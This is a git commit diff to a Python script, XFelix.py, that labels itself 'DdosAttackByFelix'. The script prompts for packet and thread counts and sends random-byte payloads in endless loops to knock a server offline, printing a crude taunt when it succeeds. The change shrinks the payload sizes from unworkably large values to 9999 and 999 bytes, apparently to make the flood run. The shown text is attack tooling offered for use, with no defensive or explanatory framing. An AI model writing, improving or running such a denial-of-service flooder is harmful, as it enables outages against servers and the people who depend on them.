54586e3d67484e8f5c379831018975b8ab2cec96
Maestro <95646935+MaestroXyz@users.noreply.github.com>
2021-12-12 10:04:26 +0700

    99

--- XFelix.py
+++ XFelix.py
@@ -13,7 +13,7 @@ choice = str(input(" DdosAttackByFelix | Gas Gak Ni?(y/n):"))
 times = int(input(" DdosAttackByFelix | Packets:"))
 threads = int(input(" DdosAttackByFelix | Threads:"))
 def run():
-	data = random._urandom(99999999999999)
+	data = random._urandom(9999)
 	i = random.choice(("[*]","[!]","[#]"))
 	while True:
 		try:
@@ -26,7 +26,7 @@ def run():
 			print("[!] | Server down kontol!!! |")
 
 def run2():
-	data = random._urandom(332297499999)
+	data = random._urandom(999)
 	i = random.choice(("[*]","[!]","[#]"))
 	while True:
 		try:
